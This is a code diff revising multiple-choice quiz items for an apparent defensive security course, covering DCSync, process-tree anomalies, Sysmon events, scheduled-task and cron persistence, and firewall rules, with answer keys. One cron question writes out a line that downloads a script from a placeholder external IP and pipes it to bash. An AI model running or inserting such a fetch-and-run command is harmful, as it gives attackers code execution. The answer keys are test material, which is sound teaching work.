+            "label": "The Schema Master on port 389, since its schema partition defines the mail attribute for the forest.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "The Global Catalog holds a partial, read-only replica of every object in every domain of the forest and is queried on its dedicated ports 3268 (plaintext) or 3269 (LDAPS), which is exactly what enables a single forest-wide search instead of querying each domain individually. The RID Master allocates relative IDs, not email indexes, and does not use port 88. SYSVOL is a file share for GPOs and scripts, not a searchable attribute index, and does not use port 445 for this purpose. The Schema Master defines object/attribute types, not a live email directory, and has no such port."
+        "explanation": "The Global Catalog holds a partial, read-only replica of every object in every domain in the forest, including searchable attributes such as email, and it is queried on its own ports, 3268 (plaintext) or 3269 (LDAPS). \"Any domain controller on port 389\" is wrong: ordinary LDAP on 389 searches only that DC's own domain partition, which is why the GC ports exist. \"The Global Catalog on port 88\" is wrong: 88 is Kerberos authentication, not directory search. \"The Schema Master on port 389\" is wrong: the schema defines which attributes can exist, not the values stored in users across the domains."
       },
       {
-        "question": "During triage you see a domain workstation (not a Domain Controller) issuing a directory-replication request to a DC, captured as Event 4662 containing replication GUIDs. Why is this a high-severity finding, and which attack does it match?",
+        "question": "During triage you see a domain workstation (not a Domain Controller) send a directory-replication request to a DC, captured as Event 4662 with replication GUIDs. Which attack does this match?",
         "options": [
           {
-            "label": "Only Domain Controllers legitimately replicate directory data, so a replication request from an ordinary workstation is the signature of DCSync — impersonating a DC to pull password hashes without touching NTDS.dit.",
+            "label": "DCSync: replication is a DC-to-DC job, so a workstation requesting it is likely pulling password hashes.",
             "value": "a"
           },
           {
-            "label": "It is routine, because every domain-joined computer replicates the full directory database to every other computer as part of normal operation.",
+            "label": "NTDS.dit dumping: the workstation is copying the AD database file off the DC using a shadow copy.",
             "value": "b"
           },
           {
-            "label": "It indicates the workstation has simply run out of RIDs and is requesting a new block from the RID Master, which is harmless maintenance.",
+            "label": "Routine replication: the workstation is refreshing its Group Policy from SYSVOL, which DCs log as 4662.",
             "value": "c"
           },
           {
-            "label": "It means the workstation has been promoted to a Global Catalog server, which any user can trigger and which poses no security concern.",
+            "label": "DCShadow: the workstation is registering itself as a rogue DC so it can push changes into the directory.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "Directory replication using DRSUAPI is legitimately performed only between Domain Controllers, so the same request originating from a workstation is the classic DCSync signature (ATT&CK T1003.006): the attacker impersonates a DC to request account password hashes directly, bypassing the NTDS.dit file. The 'routine replication' option is false — ordinary workstations never replicate the directory. The RID Master option confuses replication with RID-pool allocation. The Global Catalog promotion option invents a self-service GC promotion that does not exist and would not be benign."
+        "explanation": "Directory replication is legitimately performed between Domain Controllers, so the same request from an ordinary workstation (4662 with replication GUIDs from a non-DC) is the DCSync signature (T1003.006): the attacker poses as a DC to request account password hashes without touching the NTDS.dit file. \"NTDS.dit dumping\" is the close miss, but it happens on the DC itself (a volume shadow copy or ntdsutil on the DC), not as a replication request from a workstation. \"Routine replication\" is wrong: workstations read Group Policy files from the SYSVOL share; they do not request directory replication. \"DCShadow\" is wrong: DCShadow registers a rogue DC, which shows up as an unexpected new server or DC object (5137), not as a replication pull."
       }
     ],
     "references": [
@@ -6819,139 +6819,185 @@ const NEW_TOPIC_LESSONS = [
         "question": "An EDR alert fires on a PowerShell process. You examine the process tree and find its parent process is winword.exe (Microsoft Word), whose own parent is explorer.exe. Why is this parent-child chain a strong indicator of an attack?",
         "options": [
           {
-            "label": "It is completely normal, because Microsoft Word routinely launches PowerShell to render documents, so the chain shows healthy everyday activity and needs no review.",
+            "label": "It is not, as long as powershell.exe is signed by Microsoft, because a signed program started by Office is trusted.",
             "value": "a"
           },
           {
-            "label": "Word has no legitimate reason to spawn PowerShell, so this lineage matches a malicious macro in a document the user opened — a classic phishing execution chain.",
+            "label": "Word has no normal reason to start PowerShell, so code inside an opened document most likely launched it.",
             "value": "b"
           },
           {
-            "label": "It proves the machine is safe, because explorer.exe being the top parent guarantees that every process beneath it was digitally signed and approved.",
+            "label": "explorer.exe sits at the top of the chain, and user applications are normally started by services.exe instead.",
             "value": "c"
           },
           {
-            "label": "The concern is only that PowerShell is inherently malicious software, so the identity of the parent process is irrelevant to judging whether this is an attack.",
+            "label": "It is not, as long as PowerShell runs from its usual System32 path, whatever process happened to start it.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Word spawning PowerShell is abnormal lineage — a word processor has no legitimate reason to launch a scripting engine — and with explorer.exe above it, the chain shows a user opened a document whose macro ran PowerShell, the classic phishing execution pattern. The 'completely normal' option is false because Word does not normally launch PowerShell. The 'proves the machine is safe' option is wrong because explorer.exe being the ancestor guarantees nothing about safety. The 'PowerShell is inherently malicious' option is wrong because PowerShell is a legitimate tool; the parent's identity is exactly what makes this suspicious."
+        "explanation": "Word spawning PowerShell is abnormal lineage — a word processor has no legitimate reason to start a scripting engine — and with explorer.exe above it, the chain shows a user opened a document whose macro ran PowerShell, the classic phishing execution pattern. The signature option is wrong because PowerShell is a genuine, signed Windows tool; the problem is who started it, not whether the file is real. The explorer.exe option misreads the healthy tree: explorer.exe is the user’s desktop shell and is the normal parent of applications the user opens, while services.exe starts services. The path-only option skips the parent check the lesson stresses: a genuine binary in its normal path can still be launched by something that should never launch it."
       },
       {
         "question": "During an investigation you note that PID 4728 was a suspicious process this morning, but the same PID now belongs to a normal system service this afternoon. What does this illustrate about process IDs?",
         "options": [
           {
-            "label": "PIDs are permanent, so a single PID always refers to the exact same process forever, meaning this must be the identical program still running from the morning.",
+            "label": "The morning process is still running and has renamed itself to match the name of the system service.",
             "value": "a"
           },
           {
-            "label": "PIDs are unique at any moment but are reused after a process ends, so the same number can later belong to a completely different, unrelated process.",
+            "label": "PIDs are unique only while a process runs; once it ends, the number can go to an unrelated process.",
             "value": "b"
           },
           {
-            "label": "PIDs are assigned alphabetically by program name, so two processes sharing PID 4728 must be different versions of the very same application.",
+            "label": "The suspicious process restarted as the service, since Windows gives a restarted program its old PID back.",
             "value": "c"
           },
           {
-            "label": "A repeated PID always signals malware impersonation, so the afternoon service is definitely the morning's suspicious process wearing a disguise.",
+            "label": "The afternoon service is the morning process in disguise, because a reused PID points to impersonation.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "PIDs are unique only at a given moment; when a process ends, its PID is freed and can be reassigned to a new, unrelated process, so the same number across time can mean two different programs — which is why analysts pair PID with name, path, and start time. The 'PIDs are permanent' option is wrong because PIDs are not permanent. The alphabetical-assignment option invents an alphabetical scheme that does not exist. The malware-impersonation option over-reads a normal reuse as guaranteed impersonation."
+        "explanation": "A PID is unique only at a given moment; when a process ends its PID is freed and can be reassigned to a new, unrelated process. That is why analysts pair a PID with the process name, path and start time — or use Sysmon’s ProcessGuid, which is never reused. The renaming option assumes the same process survived, but nothing links them except a number that Windows recycles. The restart option invents a rule: a restarted program gets whatever PID is free, not its old one. The disguise option over-reads ordinary PID reuse as impersonation."
       },
       {
-        "question": "An analyst inspects a process tree and sees svchost.exe launched normally by services.exe from System32 — nothing looks unusual in the tree. Yet EDR flags it for 'suspicious image in memory'. What technique does this most likely indicate, and why does the tree alone miss it?",
+        "question": "An analyst inspects a process tree and sees svchost.exe launched normally by services.exe from System32 — nothing looks unusual in the tree. Yet EDR flags it for “suspicious image in memory”. What technique does this most likely indicate, and why does the tree alone miss it?",
         "options": [
           {
-            "label": "DLL search-order hijacking, because svchost.exe is forced to load a same-named malicious DLL placed in the System32 folder ahead of the real one.",
+            "label": "DLL search-order hijacking: svchost.exe loaded a same-named malicious DLL placed where Windows looks first.",
             "value": "a"
           },
           {
-            "label": "Process hollowing: a legitimate svchost.exe was launched normally, then its memory was replaced with malicious code, so the path and parent still look normal.",
+            "label": "Process hollowing: a real svchost.exe was started, then its memory replaced, so path and parent look normal.",
             "value": "b"
           },
           {
-            "label": "A false positive: EDR products cannot reliably analyze svchost.exe processes and routinely flag this specific normal system process without any real reason.",
+            "label": "Masquerading: malware named svchost.exe was copied into System32, so its name and path both look legitimate.",
             "value": "c"
           },
           {
-            "label": "PID reuse: the process number once used by unrelated malware was simply recycled and reassigned to this ordinary, currently running svchost.exe instance.",
+            "label": "PID reuse: a number once used by unrelated malware was recycled and given to this ordinary svchost.exe.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Process hollowing starts a legitimate executable and replaces its in-memory code after launch, so the process tree (path, parent) looks entirely normal while the executing code does not match the file on disk — which is why EDR must also check memory content, not just ancestry. The DLL search-order hijacking option describes DLL hijacking, a different technique with a different telemetry signature. The false-positive option dismisses a real detection capability. The PID reuse option misapplies PID reuse, which is about numbering, not memory tampering."
+        "explanation": "Process hollowing starts a legitimate executable and replaces its in-memory code, so the tree (path, parent) looks entirely normal while the code that runs no longer matches the file on disk — exactly what a “suspicious image in memory” check catches. DLL search-order hijacking is a different technique: a malicious module is loaded into the process (Sysmon Event ID 7), not a replacement of the process’s own image. Masquerading would put a malicious file on disk whose memory matches that file, so a memory-versus-disk check would not be the signal. PID reuse is about numbering and says nothing about memory content."
       },
       {
         "question": "Moments after a normal user logon, an analyst notices explorer.exe has no running parent process in the process tree. Is this suspicious?",
         "options": [
           {
-            "label": "No — userinit.exe launches explorer.exe as the shell and then exits itself, so a healthy explorer.exe normally shows no live parent shortly after logon.",
+            "label": "No: userinit.exe starts explorer.exe as the shell and then exits, so having no live parent is normal.",
             "value": "a"
           },
           {
-            "label": "Yes — every legitimate process must always have a currently running parent, so a missing parent for explorer.exe always proves process injection occurred.",
+            "label": "Yes: it is a sign of Parent PID Spoofing, because the real parent process was hidden at creation.",
             "value": "b"
           },
           {
-            "label": "No — explorer.exe is a kernel component that is exempt from having any parent process by design, unlike every other process on the system.",
+            "label": "Yes: explorer.exe should stay a child of winlogon.exe for the whole session, so this suggests injection.",
             "value": "c"
           },
           {
-            "label": "Yes — this specific pattern is the unique signature of process hollowing and cannot occur through any other, benign mechanism.",
+            "label": "No: explorer.exe is launched by the System process at boot, so Windows records no parent for it.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "In the normal Windows startup chain, winlogon.exe starts userinit.exe, which launches explorer.exe as the desktop shell and then terminates itself — so explorer.exe having no live parent shortly after logon is a well-known benign artifact, not evidence of tampering. The process-injection option wrongly claims every process must always retain a running parent. The kernel-component option is wrong because explorer.exe is an ordinary user-mode process, not a kernel component. The process-hollowing option over-attributes a normal, common pattern to one specific attack technique."
+        "explanation": "In the normal startup chain, winlogon.exe starts userinit.exe, which launches explorer.exe as the desktop shell and then exits — so an explorer.exe with no live parent shortly after logon is a well-known benign artifact. The PPID-spoofing option misdescribes the technique: spoofing shows a fake, innocent-looking parent, not a missing one. The winlogon option has the chain wrong: winlogon.exe starts userinit.exe, not explorer.exe, and userinit.exe is expected to exit. The System-process option is wrong because explorer.exe starts at user logon as an ordinary user-mode process, not at boot from the kernel."
       },
       {
-        "question": "An attacker uses the CreateProcess API's PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute so that a process actually launched by a malicious Word macro reports explorer.exe as its parent instead of winword.exe. Which technique is this, and what best explains why it defeats simple parent-child lineage checks?",
+        "question": "Sysmon shows a powershell.exe whose reported parent is explorer.exe, but your EDR’s kernel-level process-creation record shows it was actually created by winword.exe, seconds after the user opened an emailed document. Which technique best explains the mismatch?",
         "options": [
           {
-            "label": "Process hollowing (T1055.012) — the technique replaces a suspended process's memory, which is unrelated to what the reported PPID field shows.",
+            "label": "Process hollowing (T1055.012): replacing the process’s memory also changes the parent that Sysmon reports.",
             "value": "a"
           },
           {
-            "label": "Parent PID Spoofing (T1134.004) — the reported PPID field itself is forged at process creation, so a lineage check sees a fabricated, innocent-looking parent.",
+            "label": "Parent PID Spoofing (T1134.004): the reported parent was forged at creation, so it differs from the real caller.",
             "value": "b"
           },
           {
-            "label": "DLL search-order hijacking — the attacker places a malicious DLL where the loader finds it before the legitimate one, which changes the recorded parent process.",
+            "label": "DLL search-order hijacking: a malicious DLL loaded by Word changed the parent recorded for the new process.",
             "value": "c"
           },
           {
-            "label": "Masquerading (T1036) — the malicious process is simply renamed to look like a trusted file, which is why the PPID field reports explorer.exe.",
+            "label": "Masquerading (T1036): the process was renamed to look trusted, which is why explorer.exe shows as its parent.",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Parent PID Spoofing (T1134.004) uses CreateProcess's PROC_THREAD_ATTRIBUTE_PARENT_PROCESS to explicitly set a false PPID at creation time, so tools that only read the reported PPID field see a fabricated, trusted-looking parent like explorer.exe instead of the real one (winword.exe). The T1055.012 option describes process hollowing, a memory-replacement technique unrelated to the PPID field. The search-order hijacking option describes DLL hijacking, which does not alter the reported parent. The T1036 option describes masquerading via naming/placement, not falsification of the PPID attribute."
+        "explanation": "Parent PID Spoofing (T1134.004) sets a false parent when the process is created, so tools that read only the reported PPID see an innocent-looking parent such as explorer.exe; kernel-level creation callbacks still see the real caller, and the mismatch between the two views is the detection signal the lesson describes. Process hollowing replaces a process’s memory, which does not touch the parent field. DLL search-order hijacking changes which module a program loads, not which parent a new process reports. Masquerading changes a file’s name or location; it does not alter the recorded parent."
       },
       {
         "question": "While triaging an endpoint you find a process named lsass.exe running from C:\\Windows\\System32, but its parent process is explorer.exe rather than wininit.exe, and there is a second lsass.exe elsewhere in the tree. Why is this alarming?",
         "options": [
           {
-            "label": "Legitimate lsass.exe is a single instance whose parent is always wininit.exe and which never has a normal user process as its parent, so a second copy with explorer.exe as parent is a masquerading or credential-theft red flag.",
+            "label": "Real lsass.exe runs once, under wininit.exe; a copy started by explorer.exe points to masquerading or theft.",
             "value": "a"
           },
           {
-            "label": "It is completely normal, because Windows starts a fresh lsass.exe under each user's explorer.exe every time someone opens a new window.",
+            "label": "It is not alarming if both copies are signed by Microsoft, because a valid signature proves the process is genuine.",
             "value": "b"
           },
           {
-            "label": "It is expected because lsass.exe is designed to run many times in parallel, one per browser tab, for sandboxing.",
+            "label": "It is not alarming: Windows starts one lsass.exe for each signed-in user, under that user’s own explorer.exe.",
             "value": "c"
           },
           {
-            "label": "It only matters if the file path is wrong; the parent process and the number of instances are irrelevant to judging lsass.exe.",
+            "label": "It is not alarming, because a System32 path is the check that rules out masquerading for a Windows process.",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "On a healthy machine there is exactly one lsass.exe, it lives in System32, and its parent is wininit.exe; it is never legitimately spawned by a user shell like explorer.exe, so a duplicate with the wrong parent points to masquerading or credential theft. The per-user lsass option invents per-user lsass instances that do not exist. The one-per-browser-tab option confuses lsass with sandboxed browser processes. The 'only the file path matters' option wrongly dismisses parent and instance count, which are exactly the checks that expose this impostor."
+        "explanation": "On a healthy machine there is one lsass.exe, in System32, whose parent is wininit.exe; a user shell such as explorer.exe never legitimately starts it, so a second copy with that parent points to masquerading or credential theft. The signature option fails because a signed file can still be run in the wrong place by the wrong parent — the parent and instance count are what expose it. The per-user option invents instances that do not exist: lsass.exe is a single system-wide process. The path-only option ignores the lesson’s rule to check path and parent together; here the path looks right but the parent and the duplicate do not."
+      },
+      {
+        "question": "Sysmon Event ID 10 shows SourceImage C:\\Users\\d.rosen\\Downloads\\update.exe opening a handle to TargetImage C:\\Windows\\System32\\lsass.exe with access rights that include reading its memory. What does this most likely indicate?",
+        "options": [
+          {
+            "label": "Process injection into lsass.exe, since Event ID 10 records a new thread being started inside it.",
+            "value": "a"
+          },
+          {
+            "label": "Process hollowing of lsass.exe, since Event ID 10 reports that its in-memory image no longer matches disk.",
+            "value": "b"
+          },
+          {
+            "label": "Possible credential dumping, since an unknown program opened lsass.exe with rights to read its memory.",
+            "value": "c"
+          },
+          {
+            "label": "A routine logon, since Event ID 10 is written each time lsass.exe checks a user’s password.",
+            "value": "d"
+          }
+        ],
+        "answer": "c",
+        "explanation": "Event ID 10 (ProcessAccess) records one process opening a handle to another, and the lesson calls Event 10 with lsass.exe as the target and memory-read rights the highest-fidelity credential-dumping detection — almost nothing except a credential thief or a security tool reads LSASS memory, and a program in a Downloads folder is neither. The injection option describes Event ID 8 (CreateRemoteThread), which records a thread started inside another process. The hollowing option describes Event ID 25 (Process Tampering). The routine-logon option is wrong because Event 10 is about one process accessing another, not about authentication."
+      },
+      {
+        "question": "A 4688 event shows New Process Name …\\powershell.exe and a Creator Process ID, but the Process Command Line field is blank. What is the most likely explanation?",
+        "options": [
+          {
+            "label": "PowerShell was started with no arguments, because 4688 fills this field whenever arguments are used.",
+            "value": "a"
+          },
+          {
+            "label": "The attacker cleared the field after launch, because a blank command line in 4688 is a tampering sign.",
+            "value": "b"
+          },
+          {
+            "label": "Command lines are recorded by Sysmon Event ID 1, so 4688 cannot show them on any Windows configuration.",
+            "value": "c"
+          },
+          {
+            "label": "Command-line capture is a separate policy that is off by default, so 4688 shows what ran but not how.",
+            "value": "d"
+          }
+        ],
+        "answer": "d",
+        "explanation": "4688’s Process Command Line stays empty unless a second, separate policy (“Include command line in process creation events”) is enabled, so by default the event shows what ran but not its arguments — hiding details such as an encoded PowerShell payload. The no-arguments option assumes the field is populated by default, which it is not. The tampering option misreads a configuration gap as attacker activity. The Sysmon option goes too far: Sysmon Event ID 1 captures the command line by default, but 4688 can capture it too once the policy is enabled."
       }
     ],
     "references": [
@@ -7528,96 +7574,96 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "On a Linux server you find a new entry in /etc/cron.d that reads: */5 * * * * root curl -s http://185.x.x.x/p | bash. Why is this a strong indicator of malicious persistence?",
+        "question": "On a Linux web server, running crontab -l -u www-data shows this entry, which is not in the server's build documentation: */5 * * * * curl -s http://185.x.x.x/p | bash. How should you read it?",
         "options": [
           {
-            "label": "It is a normal system backup, because the */5 schedule means it runs only once every five days and root is the standard account for backups.",
+            "label": "Every 5 hours it fetches an update as www-data, a normal cadence for a web application's own maintenance",
             "value": "a"
           },
           {
-            "label": "It runs every 5 minutes as root, downloading and executing a remote script, which gives an attacker self-healing, reboot-surviving persistence.",
+            "label": "Every 5 minutes it downloads a remote script and runs it as www-data: recurring, self-healing persistence",
             "value": "b"
           },
           {
-            "label": "It disables cron entirely, because piping curl into bash overwrites the cron daemon and prevents any scheduled jobs from ever running again.",
+            "label": "Once an hour at minute 5, which is too infrequent to act as a beacon, so it is most likely an update check",
             "value": "c"
           },
           {
-            "label": "It is harmless test output, because cron entries beginning with */5 are comments that Linux ignores and never actually executes as commands.",
+            "label": "Once at the next boot, so it is a one-shot stager that delivers a payload rather than recurring persistence",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "The `*/5 * * * *` schedule means every 5 minutes, running as root, and `curl -s ... | bash` downloads and immediately executes a remote script — recurring, privileged, self-healing persistence that survives reboots, a classic cron abuse (T1053.003). The system backup option misreads */5 as every five days and mislabels it a backup. The 'disables cron entirely' option invents a nonexistent effect. The 'harmless test output' option is false because */5 entries are active schedules, not comments."
+        "explanation": "In the minute field, */5 means every 5 minutes, and a per-user crontab line runs as that user, here www-data. The action pipes a download from an external IP straight into bash, so every five minutes the host fetches and runs whatever the attacker serves: recurring, reboot-surviving, self-healing persistence (T1053.003). The 'every 5 hours' option reads the step as if it sat in the hour field; */5 in the hour field would be written 0 */5 * * *. The 'minute 5 of every hour' option confuses */5 with a plain 5 in the minute field. The 'once at boot' option describes an @reboot line, which this entry is not."
       },
       {
-        "question": "Which Windows event most directly signals that an attacker has created a scheduled task for persistence, and what should you examine about it?",
+        "question": "You suspect a scheduled task was planted on a workstation yesterday, but your SIEM has no Security-log task events from it because task auditing (4698 and related events) is not enabled there. Which built-in record is the best fallback for when the task was registered and by which account?",
         "options": [
           {
-            "label": "Event ID 4624, examining the logon type, because scheduled-task creation is recorded as an interactive logon by the SYSTEM account.",
+            "label": "Security Event ID 4702 on that host, which keeps logging task updates when creation auditing is off",
             "value": "a"
           },
           {
-            "label": "Event ID 4698, examining the task's action and trigger, because it records a scheduled task being created including what it runs and when.",
+            "label": "TaskScheduler/Operational Event ID 106, on by default, which logs the registration and the acting user",
             "value": "b"
           },
           {
-            "label": "Event ID 7045, examining the binary path, because scheduled tasks and Windows services are recorded by the identical event on modern systems.",
+            "label": "System log Event ID 7045, because Windows records a newly registered task as a newly installed service",
             "value": "c"
           },
           {
-            "label": "Event ID 4104, examining the script block, because every scheduled task is internally stored and logged as a PowerShell script block on creation.",
+            "label": "PowerShell Event ID 4104, because task registrations are logged as script blocks whichever tool is used",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Event ID 4698 records the creation of a scheduled task, including its action (what runs) and trigger (when), so examining those reveals whether it is malicious — for example PowerShell-encoded commands or a temp-folder binary set to run at startup. The Event ID 4624 option is wrong because 4624 is a logon event, not task creation. The Event ID 7045 option confuses scheduled tasks with services (7045). The Event ID 4104 option wrongly claims all tasks are stored as PowerShell script blocks."
+        "explanation": "The Microsoft-Windows-TaskScheduler/Operational log is enabled by default on modern Windows and records Event ID 106 (task registered), 140 (updated) and 141 (deleted), each tied to the acting user, which makes it the fallback when the Security-log 4698 family is not audited. The 4702 option is part of the same Security-log task-auditing family (4698-4702), so it is missing for the same reason. The 7045 option confuses scheduled tasks with services; 7045 records a service installation. The 4104 option only covers tasks created through PowerShell (for example Register-ScheduledTask); a task created with schtasks.exe or the GUI leaves no script block."
       },
       {
-        "question": "A scheduled task named MicrosoftEdgeUpdateTaskMachineUA triggers 'at logon of any user' and runs a hidden, Base64-encoded PowerShell command. Its Author field shows a standard employee account, not an installer or admin. Why does the Author field matter here?",
+        "question": "A 4698 event shows a new task named MicrosoftEdgeUpdateTaskMachineUA that runs hidden, Base64-encoded PowerShell at logon of any user. Its task XML lists Author: CORP\\j.chen. Which field should you rely on to establish who actually registered the task, and why?",
         "options": [
           {
-            "label": "It proves the task is legitimate, because only Microsoft's own update installer is permitted to write to the Author field on a Windows task.",
+            "label": "The Author field, because Windows writes the registering account into it and the creator cannot change it",
             "value": "a"
           },
           {
-            "label": "It suggests the task came from an ordinary employee's account rather than software deployment (to confirm via the 4698 Subject fields), consistent with that session being compromised.",
+            "label": "The 4698 Subject fields, filled from the session that registered it; Author is free text the creator sets",
             "value": "b"
           },
           {
-            "label": "It records which antivirus engine last scanned the task, so a standard user in that field means the antivirus scan simply failed.",
+            "label": "The Principal's UserId, because the account a task runs as is the account that registered the task",
             "value": "c"
           },
           {
-            "label": "It is randomly generated by Windows for every scheduled task and therefore carries no investigative meaning regardless of which account it displays.",
+            "label": "Whoever was logged on when the task first fired, since a logon trigger runs in the creator's own session",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Legitimate software installs (including real Microsoft update tasks) are normally created by an installer or SYSTEM, not a standard employee account, so an Author of an ordinary user alongside a disguised name and hidden encoded command points to that user's session being compromised and misused to plant persistence — matching the phishing indicators found alongside it. The 'proves the task is legitimate' option is false; Author is not restricted to Microsoft's installer. The antivirus-engine option invents an antivirus-scan meaning the field does not have. The 'randomly generated' option wrongly dismisses Author as meaningless; it is a useful lead, but it is free text the task's creator can set, so confirm the real creator from the 4698 event's SubjectUserName/SubjectLogonId."
+        "explanation": "The 4698 event's Subject fields (SubjectUserName, SubjectDomainName, SubjectLogonId) are filled in by Windows from the security context that actually registered the task, so they are the reliable record of the creator. In the worked example they also show CORP\\j.chen, corroborating the Author and pointing to j.chen's session being misused. The Author option treats a hint as proof: <Author> is free text in the task XML that whoever registers the task can set to anything. The Principal option confuses who runs the task with who created it; a task can be registered by one account to run as another, such as SYSTEM (S-1-5-18). The first-logon option misreads the trigger: an 'at logon of any user' trigger fires for whoever signs in, which says nothing about who created it."
       },
       {
-        "question": "You are comparing a Windows schtasks command and a Linux cron entry found on two compromised hosts. Which pairing correctly matches the two triggers that give an attacker boot-surviving, re-executing persistence, and explains why?",
+        "question": "You are comparing persistence on two compromised hosts: one Windows, one Linux. Which pairing of triggers fires at system boot itself, with no user logon and no clock schedule needed?",
         "options": [
           {
-            "label": "schtasks /sc ONSTART on Windows and an @reboot line in cron on Linux: both re-launch the payload every time the machine boots, so a reboot no longer removes the attacker.",
+            "label": "schtasks /sc ONSTART on Windows and an @reboot cron line on Linux: both run at every boot",
             "value": "a"
           },
           {
-            "label": "schtasks /sc ONCE on Windows and a @yearly line in cron on Linux: both guarantee the payload runs constantly because a one-time task and a yearly job are the most aggressive schedules available.",
+            "label": "schtasks /sc ONLOGON on Windows and an @reboot cron line on Linux: both run as the host starts",
             "value": "b"
           },
           {
-            "label": "schtasks /sc ONIDLE on Windows and @hourly in cron on Linux: both fire only when the administrator is actively typing, ensuring the attacker runs under an admin session.",
+            "label": "schtasks /sc ONSTART on Windows and an @midnight cron line on Linux: both run as each day begins",
             "value": "c"
           },
           {
-            "label": "schtasks /sc MONTHLY on Windows and @daily in cron on Linux: both are boot triggers, since Windows monthly tasks and Linux daily jobs are internally implemented as startup events.",
+            "label": "schtasks /sc MINUTE /mo 5 on Windows and */5 in cron's minute field: both fire at boot, then repeat",
             "value": "d"
           }
         ],
         "answer": "a",
-        "explanation": "On Windows /sc ONSTART runs the task at every system boot, and on Linux the @reboot shorthand runs the job once each time the machine boots; both re-launch the payload after a restart, which is the essence of reboot-surviving persistence. The ONCE/@yearly pairing is wrong: ONCE runs a single time and @yearly runs once a year, the opposite of constant. The ONIDLE/@hourly pairing misdescribes ONIDLE (it fires when the system is idle, i.e. no activity) and @hourly. The MONTHLY/@daily pairing is fabricated: monthly and daily schedules are not boot triggers."
+        "explanation": "/sc ONSTART runs a task at every system boot with no user needed, and cron's @reboot runs a job once each time the machine boots, so both re-launch the payload after any restart. The ONLOGON pairing gets Linux right but not Windows: ONLOGON waits for a user to sign in, which is persistent but not boot-triggered. The @midnight pairing gets Windows right but not Linux: @midnight is the same as @daily (0 0 * * *), a clock schedule, not a boot trigger. The MINUTE /mo 5 and */5 pairing describes matching 5-minute beacon intervals, which are clock schedules that do not fire at boot."
       }
     ],
     "references": [
@@ -7686,73 +7732,73 @@ const NEW_TOPIC_LESSONS = [
     ],
     "quiz": [
       {
-        "question": "Why is egress (outbound) firewall filtering considered such a valuable detection control, even though a firewall's most intuitive job is blocking inbound attacks?",
+        "question": "Many organisations focus their firewall effort on inbound rules. Why does this lesson call egress (outbound) filtering such a valuable detection control?",
         "options": [
           {
-            "label": "Because outbound filtering encrypts all leaving traffic, which is the only way to prevent an external attacker from ever scanning the network's open ports.",
+            "label": "Most attacks begin with an inbound connection, and egress rules are what block that first exploit attempt",
             "value": "a"
           },
           {
-            "label": "Because once an attacker is already inside, their command-and-control, data exfiltration, and tool downloads all cross the firewall outbound, so egress control catches them.",
+            "label": "Once an attacker is inside, their C2, data theft and tool downloads all have to cross the firewall outbound",
             "value": "b"
           },
           {
-            "label": "Because outbound rules are the only rules a firewall logs, so inbound traffic decisions are never recorded and cannot be reviewed by an analyst afterward.",
+            "label": "Egress rules are what make a firewall stateful, letting it permit replies to connections that users start",
             "value": "c"
           },
           {
-            "label": "Because egress filtering automatically assigns IP addresses to internal hosts, replacing DHCP and ensuring every machine can reach the internet safely.",
+            "label": "Inbound denials are scanning noise with no value, so analysts can safely stop reviewing the inbound log",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Egress filtering is powerful because an attacker who already has a foothold must reach outward — for C2 instructions, to exfiltrate data, and to download tools — so controlling and watching outbound traffic catches activity that inbound-only defence misses, and a blocked/unusual outbound connection is often the first sign of compromise. The encryption option wrongly claims egress encrypts traffic. The 'only outbound rules are logged' option is false because firewalls log inbound decisions too. The IP-assignment option confuses firewalls with DHCP."
+        "explanation": "After a foothold, the attacker’s malware must reach out for instructions (C2), stolen data must flow out, and extra tools are fetched by outbound requests, so watching and restricting what leaves catches activity that inbound rules never see. An exploit attempt arriving from outside is inbound traffic, which ingress rules handle. Stateful tracking is how a firewall remembers connections and allows their replies; it is not created by egress rules. Inbound denials still show who is knocking (for example a port scan); the lesson asks for outbound to get as much attention as inbound, not to replace it."
       },
       {
-        "question": "In firewall logs you see a single external IP generating hundreds of denied inbound connection attempts across many different ports within a minute. What does this pattern most likely represent?",
+        "question": "A firewall rulebase reads, top to bottom: (1) Any to Any, any service, Allow; (2) Internal_Net to Any, HTTPS, Allow; (3) Any to Any, RDP, Deny; (4) Any to Any, any service, Deny (default). An external host tries to open RDP to an internal server. What happens, and why?",
         "options": [
           {
-            "label": "A stateful inspection failure, because a correctly configured firewall would have allowed all of these connections rather than denying any of them.",
+            "label": "Denied: rule 3 names RDP explicitly, and a specific rule beats a general one wherever it sits",
             "value": "a"
           },
           {
-            "label": "Port scanning, an attacker probing many ports to map which services are exposed, revealed here by the burst of denied attempts across different ports.",
+            "label": "Allowed: rule 1 matches first and the first match wins, so the RDP deny in rule 3 is never reached",
             "value": "b"
           },
           {
-            "label": "Normal web browsing, because loading a single modern website legitimately opens hundreds of simultaneous inbound connections from the server to the user.",
+            "label": "Denied: a deny rule overrides an allow rule, so rule 3 wins over rule 1 regardless of their order",
             "value": "c"
           },
           {
-            "label": "Data exfiltration, because stolen data always leaves the network as a rapid series of denied inbound connections from an external address.",
+            "label": "Denied: rule 4, the default deny, catches connections to sensitive ports such as RDP before rule 1",
             "value": "d"
           }
         ],
         "answer": "b",
-        "explanation": "Many denied inbound attempts to a range of ports from one external source is the classic signature of port scanning — an attacker mapping which services are exposed — and the denials show the firewall refusing the probes. The stateful inspection failure option misreads normal deny behaviour as a failure. The normal web browsing option is wrong because web browsing is outbound-initiated by the user, not hundreds of inbound connections. The data exfiltration option describes exfiltration, which is outbound, not denied inbound traffic."
